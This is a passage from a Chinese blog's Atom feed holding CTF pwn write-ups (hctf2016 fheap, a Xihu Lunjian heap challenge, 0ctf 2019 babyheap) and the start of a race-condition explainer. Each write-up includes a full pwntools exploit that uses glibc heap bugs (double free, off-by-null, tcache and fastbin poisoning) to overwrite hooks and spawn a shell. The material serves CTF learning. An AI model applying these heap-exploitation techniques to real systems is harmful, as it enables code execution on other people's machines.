    
  </entry>
  
  <entry>
    <title>Pwn practice</title>
    <link href="http://siriuswhiter.tk/2019/03/29/pwn-practice/"/>
    <id>http://siriuswhiter.tk/2019/03/29/pwn-practice/</id>
    <published>2019-03-28T23:35:02.000Z</published>
    <updated>2019-06-03T00:46:29.629Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fheap"><a href="#fheap" class="headerlink" title="fheap"></a>fheap</h1><p>来源：<a href="https://github.com/zh-explorer/hctf2016-fheap/blob/master/main.c" target="_blank" rel="noopener">https://github.com/zh-explorer/hctf2016-fheap/blob/master/main.c</a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>只有两个功能：add delete</p><p>add 初始时会分配一个struct，然后会分两种情况： </p><ol><li>长度小于16时，不再申请新的chunk，原结构体的前十六个字节用于接收用户输入； </li><li>长度大于16时，会申请一个新的chunk，用于存放data，此时原结构体的前八个字节存放着指向新chunk的指针。</li></ol><p>原结构体的最后十六个字节，会分别存放size 及 对应的 free函数</p><p>这里可以看到输入的size没有任何卵用，后面还是根据输入的长度来确定的。</p><p>delete 会检查存放在bss段的指针，指针存在就可以释放</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>delete 函数有明显的漏洞，之前本来设置了inuse位，但是并没有检查，同时指针仅仅是free而没有置为空，所以可以double free;</p><p>还有问题就是指针同时存放在堆中，一般而言，这样很容易造成劫持；</p><p>不过这次没有show函数，也就是说，没有办法直接通过输出泄露地址，这样一般就需要劫持指针或者是最低位修改；</p><p>而且这次有个问题就是或许是因为没有设置缓冲区的原因，前面输入的chunk data在后面新建chunk会直接赋值过去，这样子造成如果初始时分配大的chunk,后面就没办法分配到小chunk了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos; ,&apos;-c&apos;]</span><br><span class="line">name = &apos;./pwnf&apos;</span><br><span class="line">p = process(name)</span><br><span class="line">elf= ELF(name)</span><br><span class="line"></span><br><span class="line"># puts_offset = 0xd1a </span><br><span class="line"># printf_pffset = 0xdbb</span><br><span class="line">def create(num,data):</span><br><span class="line">    p.recvuntil(&apos;3.quit\n&apos;)</span><br><span class="line">    p.sendline(&apos;create &apos;)</span><br><span class="line">    p.recvuntil(&apos;Pls give string size:&apos;)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(&apos;str:&apos;)</span><br><span class="line">    p.send(data)</span><br><span class="line">    </span><br><span class="line">def delete(num):</span><br><span class="line">    p.recvuntil(&apos;3.quit\n&apos;)</span><br><span class="line">    p.sendline(&apos;delete &apos;)</span><br><span class="line">    p.recvuntil(&apos;id:&apos;)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(&apos;Are you sure?:&apos;)</span><br><span class="line">    p.send(&quot;yes&quot;)</span><br><span class="line">   </span><br><span class="line">create(5,&apos;a&apos;*5)     #0</span><br><span class="line">create(5,&apos;b&apos;*5)     #1</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">#leak</span><br><span class="line">pay1 = &apos;q&apos;*20 + &apos;s&apos;*4 + &apos;\x1a&apos;</span><br><span class="line">create(32,pay1)</span><br><span class="line">delete(1)</span><br><span class="line">p.recvuntil(&apos;s&apos;*4)</span><br><span class="line">puts_addr = u64(p.recv(6) + &apos;\x00\x00&apos;)</span><br><span class="line">proc_base = puts_addr - 0xd1a </span><br><span class="line">printf_addr = proc_base + 0x9d0</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">pay2 = &apos;a&apos;*8 + &apos;%30$p&apos; + &apos;s&apos;*11 + p64(printf_addr) </span><br><span class="line">create(32,pay2)</span><br><span class="line">delete(1)</span><br><span class="line">x = p.recv()</span><br><span class="line">libc_addr = int(x[8:22],16) - 0x3b5760</span><br><span class="line">system_addr = libc_addr + 0x42510</span><br><span class="line"></span><br><span class="line">#getshell</span><br><span class="line">p.sendline(&apos;&apos;)</span><br><span class="line">delete(0)</span><br><span class="line">pay3 = &apos;/bin/sh;&apos; + &apos;s&apos;*16 + p64(system_addr) </span><br><span class="line">create(32,pay3)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p>ex师傅给的题，说是西湖论剑的一道题目，题目质量还是可以的，写一下。</p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>正常的堆，四个功能齐全，漏洞点也比较明显（虽然第一次被我直接跳过了。。）。在add的时候使用了自己的get_str函数,将最末尾置为了0，<br>也就是最近经常见到的off-by-null，不过就是这次分配时大小是固定的且libc为2.27，所以多了一些技巧性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall get_str(_BYTE *a1, int size)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; // rax</span><br><span class="line">  int v3; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v3 = 0;</span><br><span class="line">  if ( size )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      read(0, &amp;a1[v3], 1uLL);</span><br><span class="line">      if ( v3 &gt; size - 1 || !a1[v3] || a1[v3] == &apos;\n&apos; )</span><br><span class="line">        break;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    a1[v3] = 0;</span><br><span class="line">    result = &amp;a1[size];</span><br><span class="line">    *result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result = a1;</span><br><span class="line">    *a1 = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>tcache机制需要绕过，同时也带来了一些便利，比如分配时不检查size<br>思路：</p><ol><li>绕过tcache，利用unsorted bin中残留的信息泄露libc</li><li>利用tcache， 根据其中残留的信息泄露heap</li><li>利用off-by-null，改变inuse位，伪造fake chunk触发unlink实现chunk extend</li><li>将重叠的堆块重新置入tcache中，修改fd到free_hook修改为one_gadget getshell</li></ol><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;xihu&apos;)</span><br><span class="line">elf = ELF(&apos;xihu&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;xihu&apos;)</span><br><span class="line">#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,con):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;size:\n&apos;,str(size))</span><br><span class="line">sh.sendlineafter(&apos;content:\n&apos;,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,con):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line">        sh.sendafter(&apos;content:\n&apos;,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    add(0xf7,str(i)*0x20)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">#----------------unsorted bin leak libc-------------------------------# </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0xf8,&apos;&apos;)#0</span><br><span class="line">for i in range(1,7):</span><br><span class="line">    add(0xf7,str(i)) #1-6</span><br><span class="line"></span><br><span class="line">add(0xf7, &apos;7&apos;) #7</span><br><span class="line">edit(7, &apos;a&apos; *  8)</span><br><span class="line">show(7)</span><br><span class="line">sh.recvuntil(&apos;a&apos;*8)</span><br><span class="line">libc_base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;)) - 0x3ebca0</span><br><span class="line">print &quot;libc: &quot;+hex(libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">one_gadget = libc_base + 0x4f322</span><br><span class="line"></span><br><span class="line">#---------------tcache leak heap -------------------------------------# </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">edit(0,&apos;0&apos;)</span><br><span class="line">show(0)</span><br><span class="line">heap_base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))-0x730</span><br><span class="line">print hex(heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#------fake chunk unlink #---chunk extend cover fd ptr--------------#</span><br><span class="line"></span><br><span class="line">chunk0_addr = heap_base + 0x850</span><br><span class="line">fake_chunk = chunk0_addr + 0x10</span><br><span class="line"></span><br><span class="line">pay = p64(0)+p64(0xf0)+p64(fake_chunk)+p64(fake_chunk)+&apos;a&apos;*0xd0+p64(0xf0)</span><br><span class="line"></span><br><span class="line">edit(0,pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(8)</span><br><span class="line"></span><br><span class="line">for i in range(1,7):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">dele(7)</span><br><span class="line"></span><br><span class="line">for i in range(1,8):</span><br><span class="line">    add(0xf7,str(i))</span><br><span class="line"></span><br><span class="line">add(0xf7,&apos;8&apos;)</span><br><span class="line">dele(2)</span><br><span class="line">dele(8)</span><br><span class="line">pay = p64(0)+p64(0x101)+p64(free_hook)</span><br><span class="line">edit(0,pay)</span><br><span class="line"></span><br><span class="line">add(0,&apos;&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0xf7,&apos;&apos;)</span><br><span class="line">edit(8,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;fheap&quot;&gt;&lt;a href=&quot;#fheap&quot; class=&quot;headerlink&quot; title=&quot;fheap&quot;&gt;&lt;/a&gt;fheap&lt;/h1&gt;&lt;p&gt;来源：&lt;a href=&quot;https://github.com/zh-explorer/hctf2016-fheap/
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>0ctf-2019-pwn&amp;re</title>
    <link href="http://siriuswhiter.tk/2019/03/26/0ctf-2019-pwn-re/"/>
    <id>http://siriuswhiter.tk/2019/03/26/0ctf-2019-pwn-re/</id>
    <published>2019-03-26T12:36:28.000Z</published>
    <updated>2019-04-17T15:13:10.662Z</updated>
    
    <content type="html"><![CDATA[<p><em>这次的0ctf真的溃不成军，看了一些题心态爆炸</em></p><h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>还是和前两年一个风格，不过将2018的漏洞去掉了，在update时会有一个字节的溢出，溢出内容不可控，只能是’\x00’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall get_str2(__int64 des, unsigned __int64 size)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+10h] [rbp-10h]</span><br><span class="line">  ssize_t v4; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( !size )</span><br><span class="line">    return 0LL;</span><br><span class="line">  v3 = 0LL;</span><br><span class="line">  while ( v3 &lt; size )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = read(0, (void *)(v3 + des), size - v3);</span><br><span class="line">    if ( v4 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 += v4;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( *__errno_location() != 11 &amp;&amp; *__errno_location() != 4 )</span><br><span class="line">    &#123;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(des + v3) = 0;          --&gt;   here</span><br><span class="line">  return v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>当时只发现了这个漏洞，尝试了一会，当时想可能是需要把tcache填满或者把topchunk的size给消耗完(因为这次的size看上去比较小，有耗光的可能)，但是没有思路在于假如将topchunk size消耗完有什么用。遂放弃。</p><p>今天有wp出来了，出乎意料的，漏洞点确实只有这一个且前面的想法都差不多没有跑偏，但是后面缺少的的思路才是重点。</p><p>前面通过将size耗光，此时再申请时会触发consolidate，同时将之前fastbins中的的chunk归入unsorted bin,这样就有了泄露libc的机会， 通过trigger consolidation 的操作使得unsorted bin刚好覆盖到未free的chunk上，以此来泄露libc，同时也因此拥有了相当于任意地址写的机会。</p><p>同时利用此漏洞将size放入fastbin中，将chunk分配到main_arena处修改topchunk地址到malloc_hook上修改即可</p><p>问题有：</p><ol><li>申请chunk tcache与unsorted bin 的优先度？</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&quot;./babyheap&quot;)</span><br><span class="line">#sh = remote(&quot;111.186.63.20&quot;,&quot;10001&quot;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.27.so&apos;)#(&apos;libc-2.28.so&apos;)</span><br><span class="line"></span><br><span class="line">def allocate(size):</span><br><span class="line">sh.sendlineafter(&apos;Command: &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;Size: &apos;,str(size))</span><br><span class="line"></span><br><span class="line">def update(idx,size,con):</span><br><span class="line">        sh.sendlineafter(&apos;Command: &apos;,&apos;2&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line">        sh.sendlineafter(&apos;Size: &apos;,str(size))</span><br><span class="line">sh.sendlineafter(&apos;Content: &apos;,con)</span><br><span class="line">def delete(idx):</span><br><span class="line">        sh.sendlineafter(&apos;Command: &apos;,&apos;3&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;Command: &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def shrink(size,cnt):</span><br><span class="line">        for i in xrange(cnt):</span><br><span class="line">            allocate(size)</span><br><span class="line">            update(i,size,&apos;x&apos;*size)</span><br><span class="line"></span><br><span class="line">        for i in xrange(cnt):</span><br><span class="line">            delete(i)</span><br><span class="line"></span><br><span class="line">shrink(0x28,7)</span><br><span class="line">shrink(0x48,7)</span><br><span class="line">shrink(0x28,15)  #--&gt; which will be consolidate to unsorted bin</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">for i in range(7):  # 0-6</span><br><span class="line">    allocate(0x18)</span><br><span class="line">    update(i,0x17,&apos;1&apos;*0x17)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x38)     #7    # fastbins to unsorted bins and allocate from it;  malloc_consolidate won&apos;t consolidate tcache bins;</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">update(7,0x38,&apos;2&apos;*0x38)  #shrink topchunk to 0x200</span><br><span class="line"></span><br><span class="line">allocate(0x18)     #8</span><br><span class="line">allocate(0x18)     #9</span><br><span class="line">for i in range(10,15): # 10 - 14</span><br><span class="line">    allocate(0x48)</span><br><span class="line">    update(i,0x47,&apos;2&apos;*0x47)</span><br><span class="line">for i in range(1,7):  #1-6</span><br><span class="line">    delete(i)  </span><br><span class="line">delete(9)  #0x18</span><br><span class="line">delete(0)  #0x18</span><br><span class="line">delete(8)  #0x18</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x38) #0   # consolidate again            !!!!!!!!! 因为此处之前的unsortedbin被shrink了，所以后面对unsorted bin的操作无法更新chunk 0的pre_size 位，造成在这次consolidate 的时候chunk 0尝试向后合并是根据自己没有更新成功的pre_size来合并的，所以出书先overflapping,从而可以泄露libc信息</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">show(10)</span><br><span class="line">sh.recvuntil(&apos;: &apos;)</span><br><span class="line">leak_addr = u64(sh.recv(8))</span><br><span class="line">print hex(leak_addr)</span><br><span class="line">libc.address = leak_addr- 0x3ebca0</span><br><span class="line">print hex(libc.address)</span><br><span class="line">main_arena = libc.address+ 0x3ebc40</span><br><span class="line">print hex(main_arena)</span><br><span class="line">one_gadget = libc.address+ 0x4f322</span><br><span class="line">print hex(one_gadget)</span><br><span class="line">#------------------------------------------</span><br><span class="line"></span><br><span class="line">for i in range(1,4):  # 1 - 3</span><br><span class="line">    allocate(0x48)</span><br><span class="line">    update(i,0x47,&apos;3&apos;*0x47)</span><br><span class="line"></span><br><span class="line">allocate(0x58) # 4</span><br><span class="line">allocate(0x28) # 5                 // put chunk5&apos;s address  in the fastbins[0x30];</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">delete(5)</span><br><span class="line">allocate(0x58) # 5</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">update(5,0x48,&apos;\x00&apos;*0x38+p64(0x31)+p64(0x51))  # fake fd to fastbin</span><br><span class="line">allocate(0x28)</span><br><span class="line">update(6,0x20,&apos;\x00&apos;*0x18+p64(0x21))</span><br><span class="line">delete(1)</span><br><span class="line">update(10,0x8,p64(main_arena+0x10))</span><br><span class="line">allocate(0x48)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x48)</span><br><span class="line">update(8,0x48,&apos;\x00&apos;*0x40+p64(main_arena-0x38))  # edit topchunk upon malloc_hook</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x58)</span><br><span class="line">#print hex(libc.symbols[&apos;&apos;])</span><br><span class="line">update(9,0x20,&apos;\x00&apos;*0x10+p64(one_gadget)+p64(libc.symbols[&apos;svc_run&apos;]+0x42))</span><br><span class="line">allocate(0x58)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><em>整个过程特别复杂，尤其是看不到指针的情况下，与2018一样需要慢慢捋，最好在纸上记录chunk地址与idx；</em><br><em>堆的一些地方还是有盲区，理解不够细致</em></p><h1 id="zero-task"><a href="#zero-task" class="headerlink" title="zero task"></a>zero task</h1><p><em>这个是被做出来最多的pwn，条件竞争类型的，之前没有接触过，当时看到跑线程想到可能是这个，但是没去现学，不过还是得继续。</em></p><h2 id="race-condition"><a href="#race-condition" class="headerlink" title="race condition"></a>race condition</h2><p>竞争条件是系统中的一种反常现象，由于现代Linux系统中大量使用并发编程，对资源进行共享，如果产生错误的访问模式，便可能产生内存泄露，系统崩溃，数据破坏，甚至安全问题。竞争条件漏洞就是多个进程访问同一资源时产生的时间或者序列的冲突，并利用这个冲突来对系统进行攻击。一个看起来无害的程序如果被恶意攻击者利用，将发生竞争条件漏洞。</p><p>代码说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//myThreadTest</span><br><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">#include &lt;pthread.h&gt;  </span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int i = 1;  </span><br><span class="line">void *mythread1()  </span><br><span class="line">&#123;   </span><br><span class="line">    if(i == 1)&#123;</span><br><span class="line">    sleep(3);</span><br><span class="line">    if(i == 2)             </span><br><span class="line">    printf(&quot;hack it!\n&quot;);</span><br><span class="line">    else</span><br><span class="line">    printf(&quot;you can try again!\n&quot;);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">void *mythread2()  </span><br><span class="line">&#123;  </span><br><span class="line">    sleep(1);</span><br><span class="line">    i=2;      </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">int main(int argc, const char *argv[])  </span><br><span class="line">&#123;    </span><br><span class="line">    pthread_t id1,id2;  </span><br><span class="line">  </span><br><span 